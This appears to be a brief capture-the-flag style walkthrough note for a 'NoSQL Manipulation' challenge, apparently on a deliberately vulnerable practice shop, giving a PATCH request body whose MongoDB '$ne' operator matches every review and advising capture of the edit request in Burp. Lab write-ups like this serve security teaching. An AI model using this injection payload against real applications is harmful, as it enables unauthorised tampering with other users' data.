### NoSQL Manipulation

#### Difficulty: Moderate

NoSQL (non-sql or not only sql) is a query which targets databases that do not use sql.

Change query to PATCH /rest/products/reviews

{
    "message":"sdf",
    "id":{ "$ne":-1
  }
}


NOte that this is using MongoDB


But we need to UPDATE the reviews.

adding a review, then going back and editing it. Catch that request in burp.
